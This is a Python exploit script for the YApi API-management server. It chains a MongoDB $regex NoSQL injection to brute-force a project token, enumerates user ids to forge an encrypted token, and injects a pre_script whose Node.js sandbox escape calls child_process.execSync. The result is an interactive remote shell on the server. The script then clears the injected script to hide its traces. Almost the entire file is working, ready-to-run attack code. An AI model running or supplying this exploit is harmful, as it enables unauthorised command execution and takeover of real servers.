import requests
import json
import string
import sys
import logging
import utils

url = 'http://127.0.0.1:3000'
log = logging.getLogger("yapi_cracker")
logging.basicConfig(level=logging.INFO)


class NoRegister:
    token = ''  # 未加密的token
    et = ''  # 加密后的token
    uid = -1
    pid = -1
    cid = -1

    def pwn(self, token=''):
        self.detect()
        if token == '':
            self.bruce_token()
        else:
            self.token = token
        self.bruce_uid()
        self.update_project("echo '1145141919810'")
        self.bruce_cid()
        self.shell()
        self.update_project("")  # 擦屁股

    def detect(self):
        t = requests.get(url + '/api/interface/list', json={"token": {"$regex": "^"}}).text
        if '40011' in t:
            log.critical('Vulnerability not exist.')
            sys.exit(0)
        log.info('Vulnerability Found!')

    def bruce_token(self):
        dict = string.ascii_lowercase + string.digits
        done = ''
        log.info('Start bruce forcing token: ')
        for _ in range(20):
            for c in dict:
                guess = done + c
                payload = {
                    "token": {
                        "$regex": "^" + guess,
                    },
                    "id": -1
                }
                t = requests.post(url + '/api/project/up', json=payload).text
                if '405' in t:
                    done = guess
                    print(c, end='')
                    break
        print()
        assert len(done) == 20
        log.info('Found token: ' + done)
        self.token = done

    def bruce_uid(self):
        log.info('Start bruce forcing uid: ')
        for uid in range(100):
            # print('Trying uid: ' + str(uid))
            et = utils.encode_token(uid, self.token)
            text = requests.get(url + '/api/project/get?token=' + et).text
            if '没有权限' not in text:
                data = json.loads(text)['data']
                if uid == data['uid']:
                    self.pid = data['_id']
                    self.uid = uid
                    self.et = utils.encode_token(self.uid, self.token)
                    print()
                    log.info('Found uid: ' + str(self.uid))
                    return
        log.critical('uid not found :(')
        sys.exit(0)

    def update_project(self, cmd):
        code = '''var pwn = function () {
  Error.prepareStackTrace = (_, c) =>
    c.map((c) => c.getThis()).find((a) => a && a.process);
  const { stack } = new Error();
  console.info(stack.process.mainModule);
  return stack.process.mainModule.require('child_process').execSync("''' + cmd.replace('"', '\\"') + '''").toString();
};
requestHeader = pwn();'''
        payload = {
            "token": self.et,
            "id": self.pid,
            "pre_script": code
        }
        t = requests.post(url + '/api/project/up', json=payload).text
        assert '成功' in t

    def bruce_cid(self):
        for cid in range(100):
            # print('Trying cid: ' + str(cid))
            text = requests.get(url + f'/api/open/run_auto_test?token={self.token}&id={cid}').text
            if '1145141919810' in text:
                log.info('Found cid: ' + str(cid))
                print()
                self.cid = cid
                return
        log.critical('cid not found :(')
        sys.exit(0)

    def shell(self):
        print('Type quit() to quit the shell.')
        while True:
            cmd = input('> ')
            if cmd == 'quit()':
                break
            self.update_project(cmd)
            text = requests.get(url + f'/api/open/run_auto_test?token={self.token}&id={self.cid}').text
            assert 'id值不存在' not in text
            print(text.split('pre>')[1])


if __name__ == '__main__':
    Exp = NoRegister()
    Exp.pwn()
